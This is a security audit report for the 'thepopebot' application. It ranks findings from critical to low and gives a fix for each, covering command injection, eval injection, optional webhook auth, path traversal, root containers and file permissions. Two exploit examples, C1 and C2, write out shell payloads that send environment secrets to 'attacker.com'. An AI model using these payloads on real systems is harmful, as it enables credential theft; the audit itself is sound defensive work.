# Security Review: thepopebot

Full security audit covering: API route handler, NextAuth authentication, middleware, webhook systems, Docker job container, GitHub Actions CI/CD, database layer, CLI/setup tools, and credential management.

**4 CRITICAL, 11 HIGH, 16 MEDIUM, 14 LOW** findings.

---

## CRITICAL (4)

### C1. Command Injection via Trigger Template Tokens
- **Files:** `lib/triggers.js:11-19,29-31` + `lib/actions.js:16-18`
- **Description:** Trigger actions with `type: "command"` resolve `{{body}}` / `{{body.field}}` templates from incoming HTTP request payloads, then pass the result directly to `child_process.exec()`. Since `/github/webhook` and `/telegram/webhook` are public routes (C3), an **unauthenticated** attacker can inject arbitrary shell commands.
- **Exploit:** POST to `/api/github/webhook` with `{"job_id": "x; curl attacker.com?k=$(env|base64) #"}` — if any trigger watches that path with a command using `{{body.job_id}}`, secrets are exfiltrated.
- **Fix:** Replace `exec()` with `execFile()` using argument arrays, or shell-escape all template-resolved values before interpolation. Better yet, pass template values as environment variables to the subprocess.

### C2. eval Injection in Docker entrypoint.sh (Secrets Handling)
- **File:** `templates/docker/job/entrypoint.sh:22,30`
- **Description:** `eval $(echo "$SECRETS_JSON" | jq -r 'to_entries | .[] | "export \(.key)=\"\(.value)\""')` — If any secret value contains shell metacharacters (backticks, `$()`, unescaped quotes), `eval` executes them as root.
- **Exploit:** A secret value of `val"; curl attacker.com/exfil?t=$(cat /proc/self/environ) #` exfiltrates all env vars.
- **Fix:** Use `jq` with `@sh` for proper escaping: `eval $(echo "$SECRETS_JSON" | jq -r 'to_entries[] | "export \(.key)=\(.value | @sh)"')` or use a `while read` loop.

### C3. GitHub Webhook Authentication Is Optional
- **File:** `api/index.js:162-170`
- **Description:** If `GH_WEBHOOK_SECRET` is not set in the environment, the entire auth check is skipped — anyone can POST arbitrary payloads to `/api/github/webhook`. This enables C1 (command injection via triggers), fake notification injection, and LLM cost abuse via `summarizeJob()`.
- **Fix:** If `GH_WEBHOOK_SECRET` is not configured, reject all requests to this endpoint (fail-closed, not fail-open).

### C4. Path Traversal in Markdown {{include}} Processor
- **File:** `lib/utils/render-md.js:30-36`
- **Description:** `path.resolve(PROJECT_ROOT, includePath.trim())` resolves includes without validating the result stays within the project root. `{{ ../../../some/secret.md }}` reads arbitrary `.md` files on the filesystem. Limited to `.md` extension by regex but still dangerous with symlinks or if sensitive `.md` files exist outside the project.
- **Fix:** After resolving, validate `includeResolved.startsWith(PROJECT_ROOT)`. Also resolve symlinks with `fs.realpathSync()` before the check.

---

## HIGH (11)

### H1. Telegram Webhook Auth Is Optional
- **File:** `lib/channels/telegram.js:25-29`
- **Description:** Same pattern as C3 — if `TELEGRAM_WEBHOOK_SECRET` is unset, anyone can send forged Telegram updates to `/api/telegram/webhook`, impersonating any user and interacting with the LLM (including triggering job creation).
- **Fix:** Reject all Telegram webhooks when the secret is not configured.

### H2. Triggers Fire on Unauthenticated Public Routes
- **File:** `api/index.js:224-235`
- **Description:** Triggers fire after `checkAuth()` passes, but public routes (`/telegram/webhook`, `/github/webhook`, `/ping`) skip auth entirely. Combined with C1, this means command-type triggers on public routes are exploitable without any authentication.
- **Fix:** Fire triggers only after route-specific authentication succeeds, or exclude public routes from trigger matching.

### H3. Telegram Webhook Secret Uses Non-Timing-Safe Comparison
- **File:** `lib/channels/telegram.js:27`
- **Description:** `headerSecret !== TELEGRAM_WEBHOOK_SECRET` uses `!==` instead of `timingSafeEqual`. The `safeCompare()` function exists in `api/index.js` but isn't used here. Enables timing side-channel attacks to discover the secret.
- **Fix:** Use `crypto.timingSafeEqual()` (via the existing `safeCompare` helper).

### H4. API Key Hash Comparison Is Not Timing-Safe
- **File:** `lib/db/api-keys.js:137-140`
- **Description:** `cached.keyHash !== keyHash` compares SHA-256 hashes with `!==`. While hash-vs-hash comparison is harder to exploit than raw secret comparison, it violates the codebase's own documented intent of timing-safe verification.
- **Fix:** Use `crypto.timingSafeEqual()` on the hash buffers.

### H5. Job Container Runs as Root
- **File:** `templates/docker/job/Dockerfile` (no `USER` directive)
- **Description:** The entire job container (including Pi agent, Chrome, and user code) runs as root. Chrome runs with `--no-sandbox` (entrypoint.sh:14) because of this. Any container escape or Chrome exploit gives the attacker root.
- **Fix:** Create a non-root user, install deps as root, then `USER nonroot`. Run Chrome with sandboxing.

### H6. Event Handler Container Runs as Root
- **File:** `templates/docker/event-handler/Dockerfile` (no `USER` directive)
- **Description:** The event handler serves the web app as root with the entire project directory bind-mounted (`.:/app`), including `.env` with all secrets and `.git/` with full repo history.
- **Fix:** Add a non-root user. Mount only required directories, preferably read-only.

### H7. Docker Socket Shared with Runner
- **File:** `templates/docker-compose.yml:56`
- **Description:** `/var/run/docker.sock:/var/run/docker.sock` on the runner container is equivalent to host root access. A compromised job can create privileged containers, access the host filesystem, or attack other containers.
- **Fix:** Document this risk prominently. Consider rootless Docker or more isolated runner setups.

### H8. Secrets Passed as CLI Args to Docker Run
- **File:** `templates/.github/workflows/run-job.yml:52`
- **Description:** `-e SECRETS='${{ secrets.SECRETS }}'` passes the base64 blob of all secrets as a command-line argument, visible in `/proc/<pid>/cmdline` and potentially in logs if the command fails.
- **Fix:** Use `--env-file` or Docker's native secret mechanism.

### H9. Session Logs Sent in Webhook Payload
- **File:** `templates/.github/workflows/notify-pr-complete.yml:81-88,98-126`
- **Description:** Full `.jsonl` session logs (which may contain secrets, credentials, or sensitive data the agent encountered) are sent via HTTP POST to the event handler. If HTTPS is not configured (see M12), this is transmitted in plaintext.
- **Fix:** Truncate/sanitize logs before sending. Enforce HTTPS for `APP_URL`.

### H10. Command Injection in Setup via execSync
- **File:** `setup/setup.mjs:233,239`
- **Description:** `execSync('git remote add origin ${url}')` — the URL from user input via `inquirer.prompt` is interpolated into a shell command. Despite validation that it starts with `https://github.com/`, shell metacharacters after the prefix (`;`, backticks, `$()`) enable injection.
- **Fix:** Use `execFileSync('git', ['remote', 'add', 'origin', url])`.

### H11. Shell Injection in GitHub Secret/Variable Setting
- **File:** `setup/lib/github.mjs:70-71,115-116`
- **Description:** Secret values are escaped only for double quotes (`.replace(/"/g, '\\"')`) before being passed through shell via `echo "..." | gh secret set ...`. Backticks, `$()`, and backslashes are not escaped.
- **Fix:** Use `spawn('gh', [...args], { stdio: ['pipe'] })` and write the value to stdin without shell interpolation.

---

## MEDIUM (16)

### M1. No Rate Limiting on Any Endpoint
- **File:** `api/index.js` (entire file)
- `/api/create-job` can create unlimited GitHub branches; `/api/telegram/webhook` can trigger unlimited LLM calls; login endpoint has no brute-force protection.
- **Fix:** Add rate limiting middleware, especially on auth and resource-creating endpoints.

### M2. No Brute-Force Protection on Login
- **File:** `lib/auth/config.js:14-24`
- Unlimited login attempts with no lockout, CAPTCHA, or exponential backoff. Bcrypt slows individual attempts but doesn't prevent sustained attacks.
- **Fix:** Implement progressive delays or temporary lockout after N failed attempts.

### M3. No Input Size Limits on Chat Messages
- **File:** `lib/chat/api.js:14-62`
- No max length on messages, no limit on file count/size. Base64 file content is decoded without size checks (line 49-53), enabling memory exhaustion.
- **Fix:** Enforce max message length, max file count, and max file size.

### M4. Unpinned Base Image / Dependencies in Dockerfile
- **File:** `templates/docker/job/Dockerfile:1,34,40`
- `node:22-bookworm-slim` (floating tag), `npm install -g @mariozechner/pi-coding-agent` (no version pin), `git clone https://github.com/badlogic/pi-skills.git` (no commit pin). Supply chain risk.
- **Fix:** Pin base image by digest, pin npm packages by version, pin git clone by commit SHA.

### M5. Chrome Remote Debugging Port Not Bound to Localhost
- **File:** `templates/docker/job/entrypoint.sh:14`
- `--remote-debugging-port=9222` without `--remote-debugging-address=127.0.0.1` — accessible from the Docker network.
- **Fix:** Add `--remote-debugging-address=127.0.0.1`.

### M6. SECRETS Kept in Environment After Decoding
- **File:** `templates/docker/job/entrypoint.sh:23`
- `export SECRETS="$SECRETS_JSON"` re-exports the full JSON blob. If env-sanitizer has a bypass, all secrets are exposed at once.
- **Fix:** `unset SECRETS SECRETS_JSON` after extracting individual keys.

### M7. git add -A Commits Everything Including Potential Secrets
- **File:** `templates/docker/job/entrypoint.sh:92-93`
- If the Pi agent creates files containing secrets (`.env`, debug logs, config with API keys), they get committed and pushed.
- **Fix:** Enforce a `.gitignore` that excludes common secret file patterns.

### M8. TOCTOU in Auto-Merge Workflow
- **File:** `templates/.github/workflows/auto-merge.yml:17-33,112-117`
- Time gap between ALLOWED_PATHS check and merge execution. A new commit could add files outside allowed paths between check and merge.
- **Fix:** Re-check changed files immediately before merging, or use GitHub branch protection rules.

### M9. ALLOWED_PATHS Prefix Matching Can Be Tricked
- **File:** `templates/.github/workflows/auto-merge.yml:96-103`
- `[[ "$file" == "$compare"* ]]` — if allowed path is `logs`, then `logs-malicious/evil.js` also matches.
- **Fix:** Ensure trailing slash in comparison: compare against `logs/` not `logs`.

### M10. All New Users Hardcoded as Admin
- **File:** `lib/db/users.js:43`
- `createUser()` always sets `role: 'admin'`. If multi-user features are added, all users get admin by default.
- **Fix:** Accept role as a parameter with a safe default.

### M11. GH_TOKEN Parsed from .env Inside Container
- **File:** `templates/.github/workflows/rebuild-event-handler.yml:19`
- `grep "^GH_TOKEN=" /app/.env | cut -d= -f2-` — fragile parsing that could be manipulated if `.env` is modified by a compromised auto-merged PR.
- **Fix:** Pass GH_TOKEN as a proper secret/environment variable.

### M12. TLS Disabled by Default in docker-compose
- **File:** `templates/docker-compose.yml:9-15` (commented out)
- All traffic including API keys, session cookies, and webhook payloads travels in plaintext by default.
- **Fix:** Enable TLS by default or show a prominent warning during setup.

### M13. .env Written with Default (World-Readable) Permissions
- **File:** `setup/lib/auth.mjs:166-168`
- `writeFileSync(envPath, envContent)` — defaults to 0o644. Contains GH_TOKEN, API keys, AUTH_SECRET.
- **Fix:** `writeFileSync(envPath, envContent, { mode: 0o600 })`.

### M14. Database File Created with Default Permissions
- **File:** `lib/db/index.js:17-19,32-34`
- Contains password hashes, API key hashes, chat messages. Readable by all local users.
- **Fix:** Create directory with `mode: 0o700`, set DB file to 0o600.

### M15. Potential HTML Injection in Telegram Notification
- **File:** `lib/tools/telegram.js:202-207`
- `<a href="${prUrl}">View PR</a>` — `prUrl` from webhook payload is not HTML-escaped. Could inject `javascript:` URLs or break out of the attribute.
- **Fix:** Validate URL starts with `https://` and HTML-escape the value.

### M16. PAT Temporarily Embedded in Git Remote URL
- **File:** `setup/setup.mjs:327-347`
- `https://x-access-token:${pat}@github.com/...` is visible in process listings and persists in git config if cleanup fails.
- **Fix:** Use `GIT_ASKPASS` or `git credential fill` instead.

---

## LOW (14)

| ID | File | Issue |
|----|------|-------|
| L1 | `lib/auth/config.js:17-20` | User enumeration via timing (bcrypt vs early return) |
| L2 | `lib/auth/config.js:31-44` | JWT role not refreshed; no revocation mechanism |
| L3 | `lib/auth/middleware.js:10-12` | Static asset extension regex could bypass auth |
| L4 | `api/index.js:231-232` | Request headers (incl. API key) leaked to trigger context |
| L5 | `lib/chat/api.js:69-72` | Error messages may leak internal details to client |
| L6 | `lib/chat/api.js:53` | File name injection enables prompt injection |
| L7 | `lib/chat/api.js:65` | chatId not format-validated |
| L8 | `lib/db/chats.js, notifications.js` | No pagination — unbounded queries |
| L9 | `lib/utils/render-md.js:17-21` | No max recursion depth on includes |
| L10 | `lib/tools/github.js:47,213,238` | runId not validated as integer |
| L11 | `config/instrumentation.js:24-29` | AUTH_SECRET presence-only validation, no strength check |
| L12 | `lib/cron.js:21-43` | CRONS.json has no schema validation |
| L13 | `bin/cli.js:187-188` | CLI reset/diff path traversal (local-only) |
| L14 | `templates/docker-compose.yml:49` | Runner image uses unpinned `:latest` tag |

---

## INFO / Positive Findings

- **Drizzle ORM used consistently** — no SQL injection risk found
- **API key generation uses 256-bit crypto random** — strong entropy
- **Job IDs are UUIDs** — safe for branch names and file paths
- **Server Actions have built-in CSRF protection** via Next.js framework
- **next-auth pinned to beta** (`5.0.0-beta.30`) — monitor for stable v5 release
- **No test suite** — security-critical code (auth, API key verification) should have tests
- **Single API key design** — all integrations share one key, complicating rotation

---

## Recommended Fix Priority

### Immediate (exploitable remotely without auth)
1. **C1 + H2** — Sanitize trigger template values before shell execution AND fire triggers only after route-specific auth
2. **C3 + H1** — Make webhook secrets mandatory (fail-closed)
3. **C2** — Fix `eval` injection in entrypoint.sh secrets handling

### Short-term (defense-in-depth)
4. **H3 + H4** — Use timing-safe comparison everywhere
5. **C4** — Add path traversal guard to render-md.js
6. **H10 + H11** — Fix shell injection in setup scripts
7. **M1 + M2** — Add rate limiting on auth and job-creation endpoints
8. **M3** — Add input size limits to chat endpoint

### Medium-term (hardening)
9. **H5 + H6** — Run containers as non-root
10. **M4** — Pin all Docker/npm/git dependencies
11. **M6** — Unset SECRETS env var after extraction
12. **M12 + M13 + M14** — Fix file permissions and enable TLS
13. **H8** — Use env-file or Docker secrets instead of CLI args
14. **M8 + M9** — Fix TOCTOU and prefix matching in auto-merge
